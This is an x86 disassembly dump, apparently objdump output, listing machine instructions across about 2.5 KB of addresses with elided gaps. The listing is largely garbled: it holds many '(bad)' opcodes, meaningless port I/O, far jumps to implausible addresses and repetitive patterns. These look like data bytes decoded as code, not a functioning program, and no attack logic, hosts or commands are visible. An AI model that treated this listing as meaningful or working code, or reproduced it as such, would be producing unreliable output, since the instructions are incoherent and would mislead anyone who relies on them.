  446594:	popf   
  446595:	pop    es
  446596:	jmp    0x8d15:0xbc078d0e
  44659d:	pop    es
  44659e:	loop   0x4465ae
  4465a0:	popf   
  4465a1:	pop    es
  4465a2:	rcl    DWORD PTR ds:0xeda079d,cl
  4465a8:	lea    eax,[edi]
  4465aa:	(bad)  
  4465ab:	push   cs
  4465ac:	lea    eax,[edi]
  4465ae:	ror    BYTE PTR [esi],cl
  4465b0:	pop    ebp
  4465b1:	pop    es
  4465b2:	into   
  4465b3:	push   cs
  4465b4:	pop    ebp
  4465b5:	pop    es
  4465b6:	retf   0x4d0e
  4465b9:	pop    es
  4465ba:	pusha  
  4465bb:	or     al,0x4d
  4465bd:	pop    es
  4465be:	pop    esp
  4465bf:	or     al,0x5d
  4465c1:	pop    es
  4465c2:	pop    eax
  4465c3:	or     al,0x5d
  4465c5:	pop    es
  4465c6:	push   esp
  4465c7:	or     al,0x0
	...
  4465e1:	dec    ebp
  4465e2:	pop    es
  4465e3:	push   eax
  4465e4:	or     al,0x4d
  4465e6:	pop    es
  4465e7:	dec    esp
  4465e8:	or     al,0x1d
  4465ea:	pop    es
  4465eb:	dec    eax
  4465ec:	or     al,0x1d
  4465ee:	pop    es
  4465ef:	inc    esp
  4465f0:	or     al,0xd
  4465f2:	pop    es
  4465f3:	inc    eax
  4465f4:	or     al,0xd
  4465f6:	pop    es
  4465f7:	cmp    al,0xc
  4465f9:	sbb    eax,0x1d0c3807
  4465fe:	pop    es
  4465ff:	xor    al,0xc
  446601:	or     eax,0xd0c3007
  446606:	pop    es
  446607:	sub    al,0xc
  446609:	fld    QWORD PTR [esi]
  44660b:	sub    BYTE PTR [ebx*8-0x32f3dbfa],cl
  446612:	push   es
  446613:	and    BYTE PTR [ecx*8-0x22f3e3fa],cl
  44661a:	push   es
  44661b:	sbb    BYTE PTR [ebx*8-0x32f3ebfa],cl
  446622:	push   es
  446623:	adc    BYTE PTR [esp+esi*8],cl
  446626:	sbb    edi,ebp
  446628:	or     eax,DWORD PTR [eax]
  44662a:	sbb    al,0xfd
  44662c:	pop    es
  44662d:	clc    
  44662e:	sbb    edi,ebp
  446630:	add    esi,eax
  446632:	sbb    edi,ebp
  446634:	(bad)  
  446635:	call   0x406355
  44663a:	sbb    edi,ebp
  44663c:	idiv   edi
  44663e:	sbb    edi,ebp
  446640:	repz out dx,eax
  446642:	sbb    edi,ebp
  446644:	out    dx,eax
	...
  44665d:	add    bh,ch
  44665f:	sbb    edi,ebp
  446661:	jmp    0x446662
  446663:	sbb    edi,ebp
  446665:	out    0xff,eax
  446667:	sbb    edi,ebp
  446669:	jecxz  0x44665a
  44666b:	sbb    edi,ebp
  44666d:	fucomip st,st(7)
  44666f:	sbb    edi,ebp
  446671:	(bad)  
  446673:	sbb    edi,ebp
  446675:	xlat   BYTE PTR ds:[ebx]
  446676:	call   FWORD PTR [ebx]
  446678:	std    
  446679:	shr    edi,cl
  44667b:	sbb    edi,ebp
  44667d:	iret   
  44667e:	out    dx,eax
  44667f:	sbb    edi,ebp
  446681:	retf   
  446682:	call   FWORD PTR [ebx]
  446684:	std    
  446685:	(bad)  
  446686:	call   FWORD PTR [ebx]
  446688:	std    
  446689:	ret    
  44668a:	out    dx,eax
  44668b:	sbb    edi,ebp
  44668d:	mov    edi,0xbbfd1bef
  446692:	call   FWORD PTR [ebx]
  446694:	std    
  446695:	mov    bh,0xff
  446697:	sbb    edi,ebp
  446699:	mov    bl,0xef
  44669b:	sbb    edi,ebp
  44669d:	(bad)  
  44669e:	out    dx,eax
  44669f:	sbb    edi,ebp
  4466a1:	ret    0x1bff
  4466a4:	std    
  4466a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4466a6:	call   FWORD PTR [ebx]
  4466a8:	std    
  4466a9:	mov    ds:0x9ffd1bef,eax
  4466ae:	out    dx,eax
  4466af:	sbb    edi,ebp
  4466b1:	mov    esp,esp
  4466b3:	sbb    edi,ebp
  4466b5:	adc    ah,ch
  4466b7:	add    al,0xe7
  4466b9:	add    esp,DWORD PTR [eax-0xd]
  4466bc:	out    0x3,al
  4466be:	fs std 
  4466c0:	out    0x3,al
	...
  4466da:	add    BYTE PTR [eax+0x7c03e6fd],al
  4466e0:	std    
  4466e1:	out    0x3,al
  4466e3:	mov    ch,bh
  4466e5:	out    0x3,al
  4466e7:	je     0x4466e6
  4466e9:	out    0x3,al
  4466eb:	adc    dh,bh
  4466ed:	out    0x3,al
  4466ef:	xchg   esi,eax
  4466f0:	mul    esi
  4466f2:	add    esp,DWORD PTR [edx+0x403e6f7]
  4466f8:	(bad)  
  4466f9:	out    0x3,al
  4466fb:	loopne 0x4466fa
  4466fd:	out    0x3,al
  4466ff:	fdiv   st(5),st
  446701:	out    0x3,al
  446703:	fdivr  st,st(5)
  446705:	out    0x3,al
  446707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446708:	std    
  446709:	out    0x3,al
  44670b:	mov    al,ds:0x7303e6fd
  446710:	clc    
  446711:	out    0x3,al
  446713:	ja     0x44670d
  446715:	out    0x3,al
  446717:	mov    ebx,0xaf03e6f8
  44671c:	clc    
  44671d:	out    0x3,al
  44671f:	mov    ebp,?
  446721:	out    0x3,al
  446723:	mov    ch,bh
  446725:	out    0x3,al
  446727:	test   ch,bh
  446729:	out    0x3,al
  44672b:	cmp    ch,0xe6
  44672e:	add    edi,DWORD PTR [ebp+edi*8-0x1a]
  446732:	add    edi,DWORD PTR [eax-0x3]
  446735:	out    0x3,al
  446737:	je     0x446736
  446739:	out    0x3,al
  44673b:	jo     0x446739
  44673d:	out    0x3,al
	...
  446757:	add    BYTE PTR [esp+edi*8-0x1a],ch
  44675b:	add    ebp,DWORD PTR [eax-0x4]
  44675e:	out    0x3,al
  446760:	adc    al,0xfc
  446762:	(bad)  
  446763:	call   0xe949505f
  446768:	imul   esp
  44676a:	add    al,0xe9
  44676c:	div    eax
  44676e:	add    al,0xe9
  446770:	div    esp
  446772:	add    al,0xe9
  446774:	idiv   eax
  446776:	add    al,0xe9
  446778:	idiv   esp
  44677a:	add    al,0xe9
  44677c:	test   DWORD PTR [eax],0x4f7e905
  446782:	add    eax,0x608f7e9
  446787:	jmp    0xe94a7483
  44678c:	not    DWORD PTR [eax]
  44678e:	push   es
  44678f:	jmp    0xe94a7c8b
  446794:	neg    DWORD PTR [eax]
  446796:	push   es
  446797:	jmp    0xe94a8493
  44679c:	mul    DWORD PTR [eax]
  44679e:	push   es
  44679f:	jmp    0xe94a7c9b
  4467a4:	neg    DWORD PTR [eax]
  4467a6:	push   es
  4467a7:	jmp    0xe94a84a3
  4467ac:	div    DWORD PTR [eax]
  4467ae:	push   es
  4467af:	jmp    0xe94929ab
  4467b4:	idiv   DWORD PTR [eax]
  4467b6:	push   es
  4467b7:	jmp    0xe94f3ab3
	...
  4467d4:	add    bh,dh
  4467d6:	(bad)  
  4467d7:	or     ch,cl
  4467d9:	div    DWORD PTR [esi+eax*1]
  4467dc:	jmp    0xe94aa0d8
  4467e1:	idiv   DWORD PTR [esi+eax*1]
  4467e4:	jmp    0xe94ab8e0
  4467e9:	mul    ecx
  4467eb:	add    al,0xe9
  4467ed:	neg    DWORD PTR [eax+0x6]
  4467f0:	jmp    0x5304ec
  4467f5:	int    0x3
  4467f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4467f8:	or     cl,ch
  4467fa:	add    esp,DWORD PTR [eax-0x63fc22f6]
  446800:	or     bl,ch
  446802:	add    ebx,DWORD PTR [eax-0x6bfc32f6]
  446808:	or     cl,ch
  44680a:	add    edx,DWORD PTR [eax-0x73fc62f6]
  446810:	or     bl,BYTE PTR [ebp-0x72f577fd]
  446816:	add    eax,DWORD PTR [edx+ecx*1+0xa80038d]
  44681d:	popf   
  44681e:	add    ecx,DWORD PTR [edx+ecx*1+0xeec039d]
  446825:	lea    eax,[ebx]
  446827:	je     0x446833
  446829:	lea    eax,[ebx]
  44682b:	jo     0x446837
  44682d:	pop    ebp
  44682e:	add    ebp,DWORD PTR [edx+ecx*1+0x5d]
  446832:	add    ebp,DWORD PTR [eax+0xa]
  446835:	dec    ebp
  446836:	add    esp,DWORD PTR [edx+ecx*1+0x0]
	...
  446852:	dec    ebp
  446853:	add    esp,DWORD PTR [eax+0xa]
  446856:	pop    ebp
  446857:	add    ebx,DWORD PTR [edx+ecx*1+0x5d]
  44685b:	add    ebx,DWORD PTR [eax+0xa]
  44685e:	dec    ebp
  44685f:	add    edx,DWORD PTR [edx+ecx*1+0x4d]
  446863:	add    edx,DWORD PTR [eax+0xa]
  446866:	sbb    eax,0x1d0a4c03
  44686b:	add    ecx,DWORD PTR [eax+0xa]
  44686e:	or     eax,0xd0ed103
  446873:	add    edx,DWORD PTR [eax+0xa]
  446876:	sbb    eax,0x1d0a4c03
  44687b:	add    ecx,DWORD PTR [eax+0xa]
  44687e:	or     eax,0xd0a4403
  446883:	add    eax,DWORD PTR [eax+0xa]
  446886:	hlt    
  446887:	sbb    edi,ebp
  446889:	cmp    edi,esi
  44688b:	sbb    edi,ebp
  44688d:	aaa    
  44688e:	out    dx,al
  44688f:	sbb    edi,ebp
  446891:	xor    ebp,esi
  446893:	sbb    edi,ebp
  446895:	pop    ds
  446896:	(bad)  
  446897:	sbb    edi,ebp
  446899:	sbb    edi,esi
  44689b:	sbb    edi,ebp
  44689d:	pop    ss
  44689e:	out    dx,al
  44689f:	sbb    edi,ebp
  4468a1:	adc    ebp,esi
  4468a3:	sbb    edi,ebp
  4468a5:	paddd  mm3,QWORD PTR [ebx]
  4468a8:	std    
  4468a9:	or     edi,esi
  4468ab:	sbb    edi,ebp
  4468ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4468ae:	out    dx,eax
  4468af:	sbb    edi,ebp
  4468b1:	add    ebp,esi
  4468b3:	sbb    edi,ebp
  4468b5:	inc    DWORD PTR [eax]
	...
  4468cf:	(bad)  
  4468d0:	sbb    edi,ebp
  4468d2:	sti    
  4468d3:	std    
  4468d4:	sbb    edi,ebp
  4468d6:	imul   ebp
  4468d8:	sbb    edi,ebp
  4468da:	repz in eax,dx
  4468dc:	sbb    edi,ebp
  4468de:	out    dx,eax
  4468df:	std    
  4468e0:	sbb    edi,ebp
  4468e2:	jmp    0x4468e1
  4468e4:	sbb    edi,ebp
  4468e6:	out    0xed,eax
  4468e8:	sbb    edi,ebp
  4468ea:	jecxz  0x4468d9
  4468ec:	sbb    edi,ebp
  4468ee:	(bad)  
  4468f0:	sbb    edi,ebp
  4468f2:	(bad)  
  4468f4:	sbb    edi,ebp
  4468f6:	xlat   BYTE PTR ds:[ebx]
  4468f7:	in     eax,dx
  4468f8:	sbb    edi,ebp
  4468fa:	shr    ebp,cl
  4468fc:	sbb    edi,ebp
  4468fe:	iret   
  4468ff:	std    
  446900:	sbb    edi,ebp
  446902:	retf   
  446903:	std    
  446904:	sbb    edi,ebp
  446906:	out    dx,ax
  446908:	sbb    edi,ebp
  44690a:	ret    
  44690b:	in     eax,dx
  44690c:	sbb    edi,ebp
  44690e:	mov    edi,0xbbfd1bfd
  446913:	std    
  446914:	sbb    edi,ebp
  446916:	mov    bh,0xed
  446918:	add    al,0xe7
  44691a:	add    eax,DWORD PTR [eax-0x4]
  44691d:	out    0x3,al
  44691f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446920:	sti    
  446921:	out    0x3,al
  446923:	cwde   
  446924:	sti    
  446925:	out    0x3,al
  446927:	mov    ebx,?
  446929:	out    0x3,al
  44692b:	nop
  44692c:	sti    
  44692d:	out    0x3,al
  44692f:	sar    cl,1
  446931:	out    0x3,al
	...
  44694b:	add    BYTE PTR [eax-0x5],ch
  44694e:	out    0x3,al
  446950:	pop    esp
  446951:	sti    
  446952:	out    0x3,al
  446954:	pusha  
  446955:	sti    
  446956:	out    0x3,al
  446958:	test   bl,bh
  44695a:	out    0x3,al
  44695c:	js     0x446959
  44695e:	out    0x3,al
  446960:	ins    BYTE PTR es:[edi],dx
  446961:	sti    
  446962:	out    0x3,al
  446964:	jo     0x446961
  446966:	out    0x3,al
  446968:	je     0x446965
  44696a:	out    0x3,al
  44696c:	or     ah,bh
  44696e:	out    0x3,al
  446970:	cld    
  446971:	sti    
  446972:	out    0x3,al
  446974:	add    ah,bh
  446976:	out    0x3,al
  446978:	in     al,0xfb
  44697a:	out    0x3,al
  44697c:	fdivr  st,st(3)
  44697e:	out    0x3,al
  446980:	int3   
  446981:	sti    
  446982:	out    0x3,al
  446984:	sub    bh,cl
  446986:	out    0x3,al
  446988:	aam    0xfb
  44698a:	out    0x3,al
  44698c:	test   al,0xfb
  44698e:	out    0x3,al
  446990:	pushf  
  446991:	sti    
  446992:	out    0x3,al
  446994:	mov    al,ds:0xc403e6fb
  446999:	sti    
  44699a:	out    0x3,al
  44699c:	mov    eax,0xac03e6fb
  4469a1:	sti    
  4469a2:	out    0x3,al
  4469a4:	mov    al,0xfb
  4469a6:	out    0x3,al
  4469a8:	mov    ah,0xfb
  4469aa:	(bad)  
  4469ab:	call   0xe94b32a7
	...
  4469c8:	add    bh,dh
  4469ca:	int3   
  4469cb:	push   es
  4469cc:	jmp    0xe94b3ac8
  4469d1:	neg    DWORD PTR [esi-0x650816fc]
  4469d7:	add    al,0xe9
  4469d9:	not    DWORD PTR [esi-0x6d0816fc]
  4469df:	add    al,0xe9
  4469e1:	idiv   DWORD PTR [ebx]
  4469e3:	pop    es
  4469e4:	jmp    0xe948f4e0
  4469e9:	test   DWORD PTR [esi-0x7d0816fc],0x2bf7e905
  4469f3:	pop    es
  4469f4:	jmp    0xe94b91f0
  4469f9:	div    DWORD PTR [esi+0x5]
  4469fc:	jmp    0xe94b89f8
  446a01:	imul   DWORD PTR [esi+0x5]
  446a04:	jmp    0xe949d500
  446a09:	mul    DWORD PTR [esi+0x5]
  446a0c:	jmp    0xe949cd08
  446a11:	div    esp
  446a13:	pop    es
  446a14:	jmp    0xe94c5b10
  446a19:	imul   esp
  446a1b:	pop    es
  446a1c:	jmp    0xe949bd18
  446a21:	idiv   ebx
  446a23:	pop    es
  446a24:	jmp    0xe94c6220
  446a29:	div    ebx
  446a2b:	pop    es
  446a2c:	jmp    0x446a31
	...
  446a45:	add    bh,dh
  446a47:	out    dx,eax
  446a48:	pop    es
  446a49:	jmp    0xe94c5645
  446a4e:	mul    edi
  446a50:	pop    es
  446a51:	jmp    0x49a14d
  446a56:	or     eax,0x1d0b2a08
  446a5b:	or     cl,dl
  446a5d:	or     BYTE PTR ds:0xd08cd08,bl
  446a63:	or     cl,cl
  446a65:	or     BYTE PTR ds:0xdd08c508,cl
  446a6b:	pop    es
  446a6c:	push   ss
  446a6d:	or     ebx,ebp
  446a6f:	pop    es
  446a70:	adc    cl,BYTE PTR [ebx]
  446a72:	int    0x7
  446a74:	push   cs
  446a75:	or     ecx,ebp
  446a77:	pop    es
  446a78:	or     cl,BYTE PTR [ebx]
  446a7a:	fld    QWORD PTR [edi]
  446a7c:	mov    cl,0x8
  446a7e:	fld    QWORD PTR [edi]
  446a80:	lods   eax,DWORD PTR ds:[esi]
  446a81:	or     ch,cl
  446a83:	pop    es
  446a84:	test   eax,0xa507cd08
  446a89:	or     BYTE PTR [ebp-0x62f75ef9],bl
  446a8f:	pop    es
  446a90:	popf   
  446a91:	or     BYTE PTR [ebp-0x72f511f9],cl
  446a97:	pop    es
  446a98:	xchg   ebp,eax
  446a99:	or     BYTE PTR [ebp-0x62f76ef9],bl
  446a9f:	pop    es
  446aa0:	lea    ecx,[eax]
  446aa2:	lea    eax,[edi]
  446aa4:	mov    DWORD PTR [eax],ecx
  446aa6:	lea    eax,[edi]
  446aa8:	test   DWORD PTR [eax],ecx
	...
  446ac2:	add    BYTE PTR [ebp+0x7],bl
  446ac5:	or     DWORD PTR [eax],0x87d075d
  446acb:	dec    ebp
  446acc:	pop    es
  446acd:	jns    0x446ad7
  446acf:	dec    ebp
  446ad0:	pop    es
  446ad1:	jne    0x446adb
  446ad3:	pop    ebp
  446ad4:	pop    es
  446ad5:	jno    0x446adf
  446ad7:	pop    ebp
  446ad8:	pop    es
  446ad9:	ins    DWORD PTR es:[edi],dx
  446ada:	or     BYTE PTR [ebp+0x7],cl
  446add:	mov    esi,0xba074d0a
  446ae2:	or     bl,BYTE PTR ds:0xf40ab607
  446ae8:	in     eax,dx
  446ae9:	cld    
  446aea:	mov    ch,0xee
  446aec:	in     eax,dx
  446aed:	cld    
  446aee:	mov    cl,0xee
  446af0:	in     eax,dx
  446af1:	cld    
  446af2:	lods   eax,DWORD PTR ds:[esi]
  446af3:	(bad)  
  446af4:	in     eax,dx
  446af5:	cld    
  446af6:	test   eax,0xa5fcedfe
  446afb:	out    dx,al
  446afc:	in     eax,dx
  446afd:	cld    
  446afe:	mov    eax,ds:0x9dfcedee
  446b03:	(bad)  
  446b04:	jmp    0x446b02
  446b06:	cdq    
  446b07:	(bad)  
  446b08:	jmp    0x446b06
  446b0a:	xchg   ebp,eax
  446b0b:	out    dx,al
  446b0c:	jmp    0x446b0a
  446b0e:	xchg   ecx,eax
  446b0f:	out    dx,al
  446b10:	jmp    0x446b0e
  446b12:	(bad)  
  446b13:	(bad)  
  446b14:	jmp    0x446b12
  446b16:	mov    esi,edi
  446b18:	jmp    0x446b16
  446b1a:	test   esi,ebp
  446b1c:	jmp    0x446b1a
  446b1e:	sub    esi,0xfe7dfceb
  446b24:	jmp    0x446b22
  446b26:	jns    0x446b28
	...
  446b40:	(bad)  
  446b41:	jmp    0x446b3f
  446b43:	jne    0x446b33
  446b45:	jmp    0x446b43
  446b47:	jno    0x446b37
  446b49:	jmp    0x446b47
  446b4b:	ins    DWORD PTR es:[edi],dx
  446b4c:	(bad)  
  446b4d:	jmp    0x446b4b
  446b4f:	imul   edi,esi,0xee65fceb
  446b55:	jmp    0x446b53
  446b57:	popa   
  446b58:	out    dx,al
  446b59:	jmp    0x446b57
  446b5b:	pop    ebp
  446b5c:	(bad)  
  446b5d:	jmp    0x446b5b
  446b5f:	pop    ecx
  446b60:	(bad)  
  446b61:	jmp    0x446b5f
  446b63:	push   ebp
  446b64:	out    dx,al
  446b65:	jmp    0x446b63
  446b67:	push   ecx
  446b68:	out    dx,al
  446b69:	jmp    0x446b67
  446b6b:	dec    ebp
  446b6c:	(bad)  
  446b6d:	jmp    0x446b6b
  446b6f:	dec    ecx
  446b70:	(bad)  
  446b71:	jmp    0x446b6f
  446b73:	inc    ebp
  446b74:	out    dx,al
  446b75:	jmp    0x446b73
  446b77:	inc    ecx
  446b78:	out    dx,al
  446b79:	add    al,0xe7
  446b7b:	add    esi,edx
  446b7d:	push   cs
  446b7e:	out    0x3,eax
  446b80:	out    dx,al
  446b81:	push   cs
  446b82:	out    0x3,eax
  446b84:	jmp    0xe70e:0xe603e70e
  446b8b:	add    esp,edx
  446b8d:	push   cs
  446b8e:	out    0x3,eax
  446b90:	fimul  WORD PTR [esi]
  446b92:	out    0x3,eax
  446b94:	fimul  DWORD PTR [esi]
  446b96:	out    0x3,eax
  446b98:	(bad)  
  446b99:	push   cs
  446b9a:	out    0x3,eax
  446b9c:	adc    cl,BYTE PTR [edi]
  446b9e:	out    0x3,eax
  446ba0:	push   cs
  446ba1:	movntq QWORD PTR [ebx],mm0
	...
  446bbc:	add    BYTE PTR [edx],cl
  446bbe:	movntq QWORD PTR [ebx],mm0
  446bc1:	push   es
  446bc2:	movntq QWORD PTR [ebx],mm0
  446bc5:	add    cl,BYTE PTR [edi]
  446bc7:	out    0x3,eax
  446bc9:	dec    BYTE PTR [esi]
  446bcb:	out    0x3,eax
  446bcd:	cli    
  446bce:	push   cs
  446bcf:	out    0x3,eax
  446bd1:	test   BYTE PTR [esi],0xe7
  446bd4:	add    esi,DWORD PTR [edx-0x51fc18f5]
  446bda:	or     esp,edi
  446bdc:	add    ebp,DWORD PTR [edx-0x59fc18f5]
  446be2:	or     esp,edi
  446be4:	add    esp,DWORD PTR [edx-0x61fc18f5]
  446bea:	or     esp,edi
  446bec:	add    ebx,DWORD PTR [edx-0x69fc18f5]
  446bf2:	or     esp,edi
  446bf4:	add    edx,DWORD PTR [edx+0xb]
  446bf7:	out    0x3,eax
  446bf9:	dec    esi
  446bfa:	or     esp,edi
  446bfc:	add    ecx,DWORD PTR [edx+0xb]
  446bff:	out    0x3,eax
  446c01:	inc    esi
  446c02:	or     esp,edi
  446c04:	add    eax,DWORD PTR [edx+0xb]
  446c07:	out    0x3,eax
  446c09:	or     eax,DWORD PTR ds:[eax]
  446c0c:	jmp    0xe94b3708
  446c11:	test   esi,0xc2f7e906
  446c17:	push   es
  446c18:	jmp    0xe94b2b14
  446c1d:	idiv   DWORD PTR [edx+0xe906]
	...
  446c37:	add    BYTE PTR [eax],al
  446c39:	add    bh,dh
  446c3b:	mov    dh,0x6
  446c3d:	jmp    0xe94b1f39
  446c42:	imul   DWORD PTR [esi-0x550816fa]
  446c48:	push   es
  446c49:	jmp    0xe94b1345
  446c4e:	neg    DWORD PTR [esi-0x650816fa]
  446c54:	push   es
  446c55:	jmp    0xe94b0351
  446c5a:	not    DWORD PTR [edx-0x710816fa]
  446c60:	push   es
  446c61:	jmp    0xe94af75d
  446c66:	test   DWORD PTR [esi-0x7d0816fa],0x7ef7e906
  446c70:	pop    es
  446c71:	jmp    0xe94be76d
  446c76:	div    DWORD PTR [esi+0x7]
  446c79:	jmp    0xe94bdf75
  446c7e:	imul   DWORD PTR [esi+0x7]
  446c81:	jmp    0xe94bd77d
  446c86:	mul    DWORD PTR [esi+0x7]
  446c89:	jmp    0xe94bcf85
  446c8e:	neg    DWORD PTR [esi+0x7]
  446c91:	jmp    0xe94bc78d
  446c96:	not    DWORD PTR [esi+0x7]
  446c99:	jmp    0x4bbf95
	...
  446cb6:	add    BYTE PTR [ebp+0x4],bl
  446cb9:	dec    edx
  446cba:	or     DWORD PTR [ebp+0x4],ebx
  446cbd:	inc    esi
  446cbe:	or     DWORD PTR [ebp+0x4],ecx
  446cc1:	inc    edx
  446cc2:	or     DWORD PTR [ebp+0x4],ecx
  446cc5:	or     DWORD PTR ds:0x1d093a04,ebx
  446ccc:	add    al,0x36
  446cce:	or     DWORD PTR ds:0xd093204,ecx
  446cd4:	add    al,0x2e
  446cd6:	or     DWORD PTR ds:0x1d092a04,ebx
  446cdc:	add    al,0x26
  446cde:	or     DWORD PTR ds:0xd092204,ecx
  446ce4:	add    al,0x1e
  446ce6:	or     ebp,ebx
  446ce8:	add    ebx,DWORD PTR [edx]
  446cea:	or     ebp,ebx
  446cec:	add    edx,DWORD PTR [esi]
  446cee:	or     ebp,ecx
  446cf0:	add    edx,DWORD PTR [edx]
  446cf2:	or     ebp,ecx
  446cf4:	add    ecx,DWORD PTR [esi]
  446cf6:	or     ebp,ebx
  446cf8:	add    ecx,DWORD PTR [edx]
  446cfa:	or     ebp,ebx
  446cfc:	add    eax,DWORD PTR [esi]
  446cfe:	or     ebp,ecx
  446d00:	add    eax,DWORD PTR [edx]
  446d02:	or     ebp,ecx
  446d04:	add    edi,esi
  446d06:	or     BYTE PTR [ebp-0x62f705fd],bl
  446d0c:	add    esi,esi
  446d0e:	or     BYTE PTR [ebp-0x72f70dfd],cl
  446d14:	add    ebp,esi
  446d16:	or     BYTE PTR [ebp+0x8ea03],bl
	...
  446d34:	popf   
  446d35:	add    esp,esi
  446d37:	or     BYTE PTR [ebp-0x72f71dfd],cl
  446d3d:	add    ebx,esi
  446d3f:	or     BYTE PTR [ebp+0x3],bl
  446d42:	fimul  DWORD PTR [eax]
  446d44:	pop    ebp
  446d45:	add    edx,esi
  446d47:	or     ah,dh
  446d49:	in     eax,dx
  446d4a:	cld    
  446d4b:	aad    0xec
  446d4d:	in     eax,dx
  446d4e:	cld    
  446d4f:	sar    esp,1
  446d51:	in     eax,dx
  446d52:	cld    
  446d53:	int    0xfc
  446d55:	in     eax,dx
  446d56:	cld    
  446d57:	leave  
  446d58:	in     al,dx
  446d59:	in     eax,dx
  446d5a:	cld    
  446d5b:	(bad)
  446d5e:	cld    
  446d5f:	sar    esp,0xed
  446d62:	cld    
  446d63:	mov    ebp,0xb9fcedfc
  446d68:	in     al,dx
  446d69:	in     eax,dx
  446d6a:	cld    
  446d6b:	mov    ch,0xec
  446d6d:	in     eax,dx
  446d6e:	cld    
  446d6f:	mov    cl,0xfc
  446d71:	in     eax,dx
  446d72:	cld    
  446d73:	lods   eax,DWORD PTR ds:[esi]
  446d74:	cld    
  446d75:	in     eax,dx
  446d76:	cld    
  446d77:	test   eax,0xa5fcedec
  446d7c:	in     al,dx
  446d7d:	in     eax,dx
  446d7e:	cld    
  446d7f:	mov    eax,ds:0x9dfcebfc
  446d84:	cld    
  446d85:	jmp    0x446d83
  446d87:	cdq    
  446d88:	in     al,dx
  446d89:	jmp    0x446d87
  446d8b:	xchg   ebp,eax
  446d8c:	in     al,dx
  446d8d:	jmp    0x446d8b
  446d8f:	xchg   ecx,eax
  446d90:	cld    
  446d91:	jmp    0x446d8f
  446d93:	(bad)  
  446d94:	cld    
  446d95:	jmp    0x446d93
  446d97:	mov    DWORD PTR [eax],eax
	...
  446db1:	in     al,dx
  446db2:	jmp    0x446db0
  446db4:	test   esp,ebp
  446db6:	jmp    0x446db4
  446db8:	cmp    esp,0xfc7dfceb
  446dbe:	jmp    0x446dbc
  446dc0:	jns    0x446dae
  446dc2:	jmp    0x446dc0
  446dc4:	jne    0x446db2
  446dc6:	jmp    0x446dc4
  446dc8:	jno    0x446dc6
  446dca:	jmp    0x446dc8
  446dcc:	ins    DWORD PTR es:[edi],dx
  446dcd:	cld    
  446dce:	jmp    0x446dcc
  446dd0:	imul   ebp,esp,0xec65fceb
  446dd6:	jmp    0x446dd4
  446dd8:	popa   
  446dd9:	cld    
  446dda:	add    al,0xe7
  446ddc:	add    ecx,edx
  446dde:	or     al,0xe7
  446de0:	add    edi,DWORD PTR [esi-0x3dfc18f4]
  446de6:	or     al,0xe7
  446de8:	add    esp,DWORD PTR [esi-0x45fc18f4]
  446dee:	or     al,0xe7
  446df0:	add    ebp,DWORD PTR [esi-0x4dfc18f4]
  446df6:	or     al,0xe7
  446df8:	add    esi,DWORD PTR [esi-0x15fc18f4]
  446dfe:	or     al,0xe7
  446e00:	add    ebx,esi
  446e02:	or     al,0xe7
  446e04:	add    esp,edx
  446e06:	or     al,0xe7
  446e08:	add    eax,esi
  446e0a:	or     al,0xe7
  446e0c:	add    ebx,edx
  446e0e:	or     al,0xe7
  446e10:	add    ecx,esi
  446e12:	or     al,0xe7
  446e14:	add    eax,DWORD PTR [eax]
	...
  446e2e:	ror    BYTE PTR [edi+eiz*8],cl
  446e31:	add    edx,DWORD PTR [esi]
  446e33:	or     eax,0xd0a03e7
  446e38:	out    0x3,eax
  446e3a:	dec    BYTE PTR [edi+eiz*8]
  446e3d:	add    eax,DWORD PTR [edx]
  446e3f:	or     eax,0xce603e7
  446e44:	out    0x3,eax
  446e46:	cli    
  446e47:	or     al,0xe7
  446e49:	add    ecx,DWORD PTR ds:0x1103e706
  446e4f:	push   es
  446e50:	out    0x3,eax
  446e52:	test   BYTE PTR [edi+eiz*8],0x3
  446e56:	stos   BYTE PTR es:[edi],al
  446e57:	add    eax,0x59e03e7
  446e5c:	out    0x3,eax
  446e5e:	mov    ds:0x8603e705,al
  446e63:	add    eax,0x59a03e7
  446e68:	out    0x3,eax
  446e6a:	mov    es,WORD PTR ds:0xe6f7e900
  446e70:	add    cl,ch
  446e72:	mul    edx
  446e74:	add    cl,ch
  446e76:	neg    esi
  446e78:	add    cl,ch
  446e7a:	neg    edx
  446e7c:	add    cl,ch
  446e7e:	not    esi
  446e80:	add    cl,ch
  446e82:	not    edx
  446e84:	add    cl,ch
  446e86:	test   esi,0xcaf7e900
  446e8c:	add    cl,ch
  446e8e:	test   esi,0xe900
	...
  446ea8:	add    BYTE PTR [eax],al
  446eaa:	add    bh,dh
  446eac:	ret    0xe900
  446eaf:	idiv   DWORD PTR [esi-0x45081700]
  446eb5:	add    cl,ch
  446eb7:	div    DWORD PTR [esi-0x4d081700]
  446ebd:	add    cl,ch
  446ebf:	imul   DWORD PTR [esi+0x67f7e900]
  446ec5:	add    ebp,ecx
  446ec7:	mul    DWORD PTR [ebx+0x3]
  446eca:	jmp    0xe947c8c6
  446ecf:	neg    DWORD PTR [ebp+0x3]
  446ed2:	jmp    0xe947c0ce
  446ed7:	not    DWORD PTR [ebp+0x3]
  446eda:	jmp    0xe947b8d6
  446edf:	mul    DWORD PTR [eax]
  446ee1:	add    ebp,ecx
  446ee3:	test   DWORD PTR [esi-0x7d081700],0x86f7e900
  446eed:	add    cl,ch
  446eef:	idiv   DWORD PTR [edx+0x1]
  446ef2:	jmp    0xe947a0ee
  446ef7:	div    DWORD PTR ds:0x29f7e903
  446efd:	add    eax,DWORD PTR [eax]
  446eff:	popf   
  446f00:	or     BYTE PTR [edi],ah
  446f02:	add    eax,0x766088d
  446f07:	lea    ecx,[eax]
  446f09:	bound  eax,QWORD PTR [edi]
  446f0b:	pop    ebp
  446f0c:	or     BYTE PTR [esi+0x7],bl
	...
  446f27:	add    BYTE PTR [ebp+0x8],bl
  446f2a:	pop    edx
  446f2b:	pop    es
  446f2c:	dec    ebp
  446f2d:	or     BYTE PTR [esi+0x7],dl
  446f30:	dec    ebp
  446f31:	or     BYTE PTR [edx+0x7],dl
  446f34:	pop    ebp
  446f35:	or     BYTE PTR [esi+0x7],cl
  446f38:	pop    ebp
  446f39:	or     BYTE PTR [edx+0x7],cl
  446f3c:	dec    ebp
  446f3d:	or     BYTE PTR [ebx],al
  446f3f:	add    eax,0x4ff084d
  446f44:	sbb    eax,0x1d04fb08
  446f49:	or     BYTE PTR [edx],bh
